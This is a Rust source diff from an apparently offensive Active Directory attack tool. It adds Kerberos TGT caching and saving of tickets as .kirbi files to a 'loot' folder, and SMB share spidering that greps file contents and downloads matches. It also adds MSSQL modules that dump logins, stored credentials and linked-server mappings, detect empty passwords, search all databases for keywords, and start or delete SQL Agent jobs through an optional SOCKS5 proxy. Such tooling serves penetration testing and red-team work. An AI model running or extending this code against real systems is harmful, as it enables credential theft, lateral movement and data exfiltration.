+                &secret,
+                use_hash,
+                false,
+            )
+            .await
+            {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!("TGT request failed: {}", e));
+                    return 1;
+                }
+            };
             println!(
                 "{} TGT obtained for {}@{}",
                 "✓".green(),
@@ -5617,7 +6007,7 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     concurrency: 10,
                     timeout: 30,
                     jitter_ms: 0,
-                    tgt: None,
+                    tgt: Some(tgt.clone()),
                 };
                 let kc = overthrone_hunter::kerberoast::KerberoastConfig {
                     downgrade_to_rc4: downgrade_rc4,
@@ -5875,17 +6265,23 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     return 1;
                 }
             };
-            // Get TGT first
-            let tgt =
-                match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
-                    .await
-                {
-                    Ok(t) => t,
-                    Err(e) => {
-                        banner::print_fail(&format!("TGT request failed: {}", e));
-                        return 1;
-                    }
-                };
+            // Get TGT first (with cache-first logic)
+            let tgt = match crate::commands_impl::get_cached_tgt(
+                &dc,
+                &creds.domain,
+                &creds.username,
+                &secret,
+                use_hash,
+                false,
+            )
+            .await
+            {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!("TGT request failed: {}", e));
+                    return 1;
+                }
+            };
             // Request service ticket
             match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
                 Ok(st) => {
@@ -5909,6 +6305,7 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             }
         }
         KerberosAction::GetTgt => {
+            use overthrone_core::cred_cache::CredCache;
             use overthrone_core::proto::kerberos;
             let creds = match require_creds(cli) {
                 Ok(c) => c,
@@ -5922,13 +6319,21 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                 }
             };
 
-            match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
-                .await
+            match crate::commands_impl::get_cached_tgt(
+                &dc,
+                &creds.domain,
+                &creds.username,
+                &secret,
+                use_hash,
+                false,
+            )
+            .await
             {
                 Ok(tgt) => {
                     println!(
-                        "{} TGT obtained for {}@{}",
+                        "{} TGT {} for {}@{}",
                         "✓".green(),
+                        "obtained".cyan(),
                         tgt.client_principal.cyan(),
                         tgt.client_realm.cyan()
                     );
@@ -5936,12 +6341,14 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     let loot_dir = std::path::PathBuf::from("./loot");
                     let _ = std::fs::create_dir_all(&loot_dir);
                     let kirbi_path = loot_dir.join("tgt.kirbi");
-                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
-                        use kerberos_asn1::Asn1Object;
-                        use std::io::Write;
-                        let _ = f.write_all(&tgt.ticket.build());
+                    let kirbi_bytes = kerberos::tgd_to_kirbi(&tgt);
+                    if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
                         println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
                     }
+
+                    let cache = CredCache::new();
+                    let _ = cache.save_tgt(&tgt);
+
                     banner::print_success("TGT obtained");
                     return 0;
                 }
@@ -6061,18 +6468,57 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
             }
             banner::print_success("Admin check completed");
         }
-        SmbAction::Spider { target, extensions } => {
+        SmbAction::Spider {
+            target,
+            extensions,
+            grep,
+            regex,
+            output_dir,
+            max_depth,
+        } => {
             let ext_list: Vec<String> = extensions
                 .split(',')
                 .map(|s| s.trim().to_lowercase())
                 .filter(|s| !s.is_empty())
                 .collect();
 
+            let content_search = grep.is_some() || regex.is_some();
+            let re = if let Some(ref p) = regex {
+                match regex::RegexBuilder::new(p).case_insensitive(true).build() {
+                    Ok(r) => Some(r),
+                    Err(e) => {
+                        banner::print_fail(&format!("Invalid regex pattern: {e}"));
+                        return 1;
+                    }
+                }
+            } else {
+                None
+            };
+
+            let keyword = grep.as_ref().map(|k| k.to_lowercase());
+
+            if let Some(ref dir) = output_dir
+                && let Err(e) = std::fs::create_dir_all(dir)
+            {
+                banner::print_fail(&format!("Cannot create output dir {}: {}", dir, e));
+                return 1;
+            }
+
+            let mut search_desc = ext_list.join(", ");
+            if content_search {
+                if let Some(ref k) = grep {
+                    search_desc = format!("{} | grep: {}", search_desc, k);
+                }
+                if let Some(ref r) = regex {
+                    search_desc = format!("{} | regex: {}", search_desc, r);
+                }
+            }
+
             println!(
                 "{} Spidering shares on: {} (filtering: {})",
                 "🕷".bright_black(),
                 target.cyan(),
-                ext_list.join(", ").yellow()
+                search_desc.yellow()
             );
 
             let smb = match smb_connect(&target).await {
@@ -6088,6 +6534,8 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                 "HR",
             ];
             let mut total_found = 0usize;
+            let mut content_matches = 0usize;
+            let mut downloaded = 0usize;
 
             for &share in candidate_shares {
                 if !smb.check_share_read(share).await {
@@ -6100,9 +6548,12 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                     share.yellow()
                 );
 
-                // BFS walk of the share
-                let mut queue: Vec<String> = vec![String::new()];
-                while let Some(dir) = queue.pop() {
+                // BFS walk of the share with depth tracking
+                let mut queue: Vec<(String, usize)> = vec![(String::new(), 0)];
+                while let Some((dir, depth)) = queue.pop() {
+                    if depth >= max_depth {
+                        continue;
+                    }
                     let entries = match smb.list_directory(share, &dir).await {
                         Ok(e) => e,
                         Err(_) => continue,
@@ -6110,7 +6561,7 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                     for entry in entries {
                         if entry.is_directory {
                             if queue.len() < 5000 {
-                                queue.push(entry.path.clone());
+                                queue.push((entry.path.clone(), depth + 1));
                             }
                         } else {
                             let name_lower = entry.name.to_lowercase();
@@ -6118,15 +6569,73 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                                 || ext_list
                                     .iter()
                                     .any(|ext| name_lower.ends_with(ext.as_str()));
-                            if matched {
-                                println!(
-                                    "    {} \\\\{}\\{}\\{}  ({} bytes)",
-                                    "📄".bright_black(),
-                                    target,
-                                    share,
-                                    entry.path,
-                                    entry.size
-                                );
+                            if !matched {
+                                continue;
+                            }
+
+                            let display_path = format!(
+                                "\\\\{}\\{}\\{}",
+                                target.cyan(),
+                                share.yellow(),
+                                entry.path
+                            );
+
+                            let mut print_line = format!(
+                                "    {} {}  ({} bytes)",
+                                "📄".bright_black(),
+                                display_path,
+                                entry.size
+                            );
+
+                            if content_search {
+                                match smb.read_file(share, &entry.path).await {
+                                    Ok(data) => {
+                                        let content_lower =
+                                            String::from_utf8_lossy(&data).to_lowercase();
+                                        let mut content_hit = false;
+
+                                        if let Some(ref kw) = keyword {
+                                            content_hit = content_lower.contains(kw.as_str());
+                                        }
+                                        if !content_hit && let Some(ref r) = re {
+                                            content_hit = r.is_match(&content_lower);
+                                        }
+
+                                        if content_hit {
+                                            print_line.push_str(&format!(
+                                                "  {}",
+                                                "[MATCH]".green().bold()
+                                            ));
+                                            content_matches += 1;
+
+                                            if let Some(ref dir) = output_dir {
+                                                let safe_name =
+                                                    entry.path.replace(['\\', '/', ':'], "_");
+                                                let out_path =
+                                                    std::path::Path::new(dir).join(&safe_name);
+                                                if let Err(e) = std::fs::write(&out_path, &data) {
+                                                    print_line.push_str(&format!(
+                                                        "  {}",
+                                                        format!("[dl error: {e}]").red()
+                                                    ));
+                                                } else {
+                                                    downloaded += 1;
+                                                }
+                                            }
+                                            println!("{}", print_line);
+                                            total_found += 1;
+                                        }
+                                    }
+                                    Err(e) => {
+                                        print_line.push_str(&format!(
+                                            "  {}",
+                                            format!("[read error: {e}]").red()
+                                        ));
+                                        println!("{}", print_line);
+                                    }
+                                }
+                            } else {
+                                println!("{}", print_line);
                                 total_found += 1;
                             }
                         }
@@ -6137,7 +6646,18 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
             if total_found == 0 {
                 banner::print_warn("No matching files found");
             } else {
-                banner::print_success(&format!("Spider found {} matching file(s)", total_found));
+                let mut summary = format!("Spider found {} matching file(s)", total_found);
+                if content_matches > 0 {
+                    summary.push_str(&format!(", {} content matches", content_matches));
+                }
+                if downloaded > 0 {
+                    summary.push_str(&format!(
+                        ", {} downloaded to {}",
+                        downloaded,
+                        output_dir.as_deref().unwrap_or(".").cyan()
+                    ));
+                }
+                banner::print_success(&summary);
             }
         }
         SmbAction::Get { target, path } => {
@@ -6914,7 +7434,7 @@ async fn cmd_spray(
 // is intentionally disabled. Wizard remains the interactive/autonomous interface.
 
 // cmd_mssql
-async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
+async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
     use overthrone_core::mssql::{MssqlClient, MssqlConfig};
 
     banner::print_module_banner("MSSQL");
@@ -6934,6 +7454,10 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
         }
     };
 
+    if let Some(p) = proxy {
+        banner::print_info(&format!("Using SOCKS5 proxy: {}", p));
+    }
+
     match action {
         MssqlAction::Query {
             target,
@@ -6949,7 +7473,8 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
             );
             let config = MssqlConfig::new(&target)
                 .with_ntlm_auth(&creds.domain, &creds.username, &password)
-                .with_database(&database);
+                .with_database(&database)
+                .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
                 Ok(c) => c,
                 Err(e) => {
@@ -6990,7 +7515,8 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
             );
             let config = MssqlConfig::new(&target)
                 .with_ntlm_auth(&creds.domain, &creds.username, &password)
-                .with_database("master");
+                .with_database("master")
+                .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
                 Ok(c) => c,
                 Err(e) => {
@@ -7023,7 +7549,8 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
             );
             let config = MssqlConfig::new(&target)
                 .with_ntlm_auth(&creds.domain, &creds.username, &password)
-                .with_database("master");
+                .with_database("master")
+                .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
                 Ok(c) => c,
                 Err(e) => {
@@ -7071,7 +7598,8 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
             );
             let config = MssqlConfig::new(&target)
                 .with_ntlm_auth(&creds.domain, &creds.username, &password)
-                .with_database("master");
+                .with_database("master")
+                .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
                 Ok(c) => c,
                 Err(e) => {
@@ -7099,7 +7627,8 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
             );
             let config = MssqlConfig::new(&target)
                 .with_ntlm_auth(&creds.domain, &creds.username, &password)
-                .with_database("master");
+                .with_database("master")
+                .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
                 Ok(c) => c,
                 Err(e) => {
@@ -7120,6 +7649,355 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
                     let _ = client.close().await;
                     return 1;
                 }
+            }
+            let _ = client.close().await;
+        }
+        MssqlAction::Audit {
+            targets,
+            crawl_links,
+            output,
+        } => {
+            println!("{} Running MSSQL security audit...", ">".bright_black());
+            println!("  Target(s): {}", targets.join(", "));
+            if crawl_links {
+                println!("  Linked server crawling: enabled");
+            }
+
+            use overthrone_reaper::mssql_audit::build_mssql_audit_checks;
+            let checks = build_mssql_audit_checks();
+            println!("  {} checks configured", checks.len());
+
+            let mut all_findings: Vec<serde_json::Value> = Vec::new();
+
+            for target in &targets {
+                println!("{} Auditing {}...", ">".bright_black(), target.cyan());
+
+                let config = MssqlConfig::new(target.as_str())
+                    .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                    .with_database("master")
+                    .with_proxy(proxy);
+                let mut client = match MssqlClient::connect(config).await {
+                    Ok(c) => c,
+                    Err(e) => {
+                        banner::print_fail(&format!("Connect to {} failed: {}", target, e));
+                        continue;
+                    }
+                };
+
+                let mut server_findings: Vec<serde_json::Value> = Vec::new();
+                for check in &checks {
+                    match client.query(&check.query).await {
+                        Ok(results) => {
+                            let vulnerable = !results.rows.is_empty();
+                            if vulnerable {
+                                let finding = serde_json::json!({
+                                    "server": target,
+                                    "check": check.name,
+                                    "category": format!("{:?}", check.category),
+                                    "description": check.description,
+                                    "finding": check.finding,
+                                    "remediation": check.remediation,
+                                    "severity": format!("{:?}", check.severity),
+                                });
+                                println!(
+                                    "  {} [{}] {}",
+                                    match check.severity {
+                                        overthrone_reaper::mssql_audit::Severity::Critical =>
+                                            "🔴".to_string(),
+                                        overthrone_reaper::mssql_audit::Severity::High =>
+                                            "🟠".to_string(),
+                                        overthrone_reaper::mssql_audit::Severity::Medium =>
+                                            "🟡".to_string(),
+                                        _ => "🔵".to_string(),
+                                    },
+                                    check.name,
+                                    check.description.bright_black()
+                                );
+                                server_findings.push(finding);
+                            }
+                        }
+                        Err(e) => {
+                            println!("  {} {} check error: {}", "!".yellow(), check.name, e);
+                        }
+                    }
+                }
+
+                let _ = client.close().await;
+
+                banner::print_success(&format!(
+                    "{}: {} vulnerability(ies) found",
+                    target,
+                    server_findings.len()
+                ));
+                all_findings.extend(server_findings);
+            }
+
+            if let Some(out_path) = output {
+                let json = serde_json::to_string_pretty(&serde_json::json!({
+                    "targets": &targets,
+                    "crawl_links": crawl_links,
+                    "total_checks": checks.len(),
+                    "findings_count": all_findings.len(),
+                    "findings": &all_findings,
+                }))
+                .unwrap_or_default();
+                let path = out_path.clone();
+                match tokio::fs::write(&path, json.as_bytes()).await {
+                    Ok(_) => banner::print_success(&format!("Audit written to {}", out_path)),
+                    Err(e) => banner::print_fail(&format!("Failed to write audit: {}", e)),
+                }
+            }
+        }
+        MssqlAction::DumpCredentials { target, database } => {
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database(database.as_str())
+                .with_proxy(proxy);
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect failed: {}", e));
+                    return 1;
+                }
+            };
+
+            banner::print_info("SQL Server Logins:");
+            if let Ok(result) = client.query(
+                "SELECT name, principal_id, type_desc, is_disabled, is_policy_checked, is_expiration_checked FROM sys.sql_logins ORDER BY name"
+            ).await {
+                for row in &result.rows {
+                    let name = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
+                    let disabled = row.get(3).and_then(|v| v.as_deref()).unwrap_or("?");
+                    println!("  {} | disabled:{}", name.cyan(), disabled.yellow());
+                }
+                if !result.rows.is_empty() {
+                    banner::print_success(&format!("{} SQL login(s) found", result.rows.len()));
+                }
+            }
+
+            banner::print_info("Stored Credentials:");
+            if let Ok(result) = client
+                .query("SELECT name, credential_identity FROM sys.credentials ORDER BY name")
+                .await
+            {
+                for row in &result.rows {
+                    let name = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
+                    let ident = row.get(1).and_then(|v| v.as_deref()).unwrap_or("?");
+                    println!("  {} -> identity: {}", name.cyan(), ident.yellow());
+                }
+            }
+
+            banner::print_info("Linked Server Mappings:");
+            if let Ok(result) = client.query(
+                "SELECT s.name, l.remote_name, l.uses_self_credential FROM sys.servers s JOIN sys.linked_logins l ON s.server_id = l.server_id WHERE s.is_linked = 1"
+            ).await {
+                for row in &result.rows {
+                    let srv = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
+                    let remote = row.get(1).and_then(|v| v.as_deref()).unwrap_or("?");
+                    let self_cred = row.get(2).and_then(|v| v.as_deref()).unwrap_or("0");
+                    println!("  {} -> remote: {} [self_credential: {}]", srv.cyan(), remote.yellow(), self_cred);
+                }
+            }
+
+            banner::print_info("Empty Password Check:");
+            if let Ok(result) = client
+                .query("SELECT name FROM sys.sql_logins WHERE PWDCOMPARE('', password_hash) = 1")
+                .await
+            {
+                for row in &result.rows {
+                    let name = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
+                    println!("  {} — EMPTY PASSWORD", name.red().bold());
+                }
+                if result.rows.is_empty() {
+                    banner::print_info("No empty-password logins");
+                }
+            }
+
+            let _ = client.close().await;
+        }
+        MssqlAction::Search {
+            target,
+            keyword,
+            regex,
+            database,
+            max_rows,
+        } => {
+            if keyword.is_none() && regex.is_none() {
+                banner::print_fail("Specify --keyword or --regex for content search");
+                return 1;
+            }
+
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database(database.as_deref().unwrap_or("master"))
+                .with_proxy(proxy);
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect failed: {}", e));
+                    return 1;
+                }
+            };
+
+            let dbs: Vec<String> = match database {
+                Some(ref db) => vec![db.clone()],
+                None => match client.query(
+                    "SELECT name FROM sys.databases WHERE database_id > 4 AND state = 0 ORDER BY name"
+                ).await {
+                    Ok(r) => r.rows.iter().filter_map(|row| row.first().and_then(|v| v.clone())).collect(),
+                    Err(e) => { banner::print_fail(&format!("Failed: {}", e)); let _ = client.close().await; return 1; }
+                }
+            };
+
+            if dbs.is_empty() {
+                banner::print_info("No user databases");
+                let _ = client.close().await;
+                return 0;
+            }
+
+            let mut total = 0usize;
+            for db in &dbs {
+                let _ = client.query(&format!("USE [{}]", db)).await;
+                let tables = match client.query(
+                    "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA != 'sys'"
+                ).await {
+                    Ok(r) => r.rows,
+                    Err(_) => continue,
+                };
+
+                for t in &tables {
+                    let schema = t.first().and_then(|v| v.as_deref()).unwrap_or("dbo");
+                    let table = t.get(1).and_then(|v| v.as_deref()).unwrap_or("?");
+                    let full = format!("{}.{}", schema, table);
+
+                    let cols = match client.query(&format!(
+                        "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{}' \
+                         AND TABLE_NAME='{}' AND DATA_TYPE IN ('varchar','nvarchar','text','ntext','char','nchar')",
+                        schema.replace('\'', "''"), table.replace('\'', "''")
+                    )).await {
+                        Ok(r) => r.rows,
+                        Err(_) => continue,
+                    };
+
+                    let col_names: Vec<String> = cols
+                        .iter()
+                        .filter_map(|r| r.first().and_then(|v| v.clone()))
+                        .collect();
+                    if col_names.is_empty() {
+                        continue;
+                    }
+
+                    let term = match (&keyword, &regex) {
+                        (Some(kw), _) => col_names
+                            .iter()
+                            .map(|c| format!("{} LIKE '%{}%'", c, kw.replace('\'', "''")))
+                            .collect::<Vec<_>>()
+                            .join(" OR "),
+                        (_, Some(rx)) => col_names
+                            .iter()
+                            .map(|c| format!("{} LIKE '%{}%'", c, rx.replace('\'', "''")))
+                            .collect::<Vec<_>>()
+                            .join(" OR "),
+                        _ => {
+                            banner::print_fail("No --keyword or --regex provided for search");
+                            return 1;
+                        }
+                    };
+
+                    match client
+                        .query(&format!(
+                            "SELECT TOP {} {} FROM {} WHERE {}",
+                            max_rows,
+                            col_names.join(", "),
+                            full,
+                            term
+                        ))
+                        .await
+                    {
+                        Ok(sr) if !sr.rows.is_empty() => {
+                            total += sr.rows.len();
+                            println!("  {} ({} hits)", full.cyan(), sr.rows.len());
+                            for row in &sr.rows {
+                                println!(
+                                    "    {}",
+                                    row.iter()
+                                        .map(|v| v.as_deref().unwrap_or("NULL"))
+                                        .collect::<Vec<_>>()
+                                        .join(" | ")
+                                        .bright_black()
+                                );
+                            }
+                        }
+                        _ => {}
+                    }
+                }
+            }
+            if total == 0 {
+                banner::print_info("No matches");
+            } else {
+                banner::print_success(&format!("{} match(es)", total));
+            }
+            let _ = client.close().await;
+        }
+        MssqlAction::AgentJob {
+            target,
+            action,
+            name,
+        } => {
+            println!(
+                "{} Managing jobs on {} — action: {}",
+                ">".bright_black(),
+                target.cyan(),
+                action.yellow()
+            );
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database("msdb")
+                .with_proxy(proxy);
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect failed: {}", e));
+                    return 1;
+                }
+            };
+
+            match action.as_str() {
+                "list" => match client.query(
+                    "SELECT j.name, j.enabled, j.description, SUSER_SNAME(j.owner_sid) AS owner, \
+                     COUNT(js.step_id) AS steps FROM msdb.dbo.sysjobs j \
+                     LEFT JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id \
+                     GROUP BY j.name, j.enabled, j.description, j.owner_sid ORDER BY j.name"
+                ).await {
+                    Ok(r) if !r.rows.is_empty() => {
+                        for row in &r.rows {
+                            println!("  {} | owner: {} | steps: {} | {}",
+                                row.first().and_then(|v| v.as_deref()).unwrap_or("?").cyan(),
+                                row.get(3).and_then(|v| v.as_deref()).unwrap_or("?").yellow(),
+                                row.get(4).and_then(|v| v.as_deref()).unwrap_or("0"),
+                                if row.get(1).and_then(|v| v.as_deref()) == Some("1") { "ENABLED".green() } else { "DISABLED".bright_black() }
+                            );
+                        }
+                    }
+                    Ok(_) => banner::print_info("No jobs found"),
+                    Err(e) => banner::print_fail(&format!("List failed: {}", e)),
+                },
+                act @ ("start" | "stop" | "delete") => {
+                    let job_name = match name.as_deref() {
+                        Some(n) => n,
+                        None => { banner::print_fail("--name required"); let _ = client.close().await; return 1; }
+                    };
+                    let sp = match act {
+                        "start" => "sp_start_job",
+                        "stop" => "sp_stop_job",
+                        _ => "sp_delete_job",
+                    };
+                    match client.execute(&format!("EXEC msdb.dbo.{} @job_name = N'{}'", sp, job_name.replace('\'', "''"))).await {
+                        Ok(_) => banner::print_success(&format!("Job '{}' {}", job_name, act)),
+                        Err(e) => banner::print_fail(&format!("Failed to {} '{}': {}", act, job_name, e)),
+                    }
+                }
+                other => banner::print_fail(&format!("Unknown action '{}'. Use: list, start, stop, delete", other)),
             }
             let _ = client.close().await;
         }
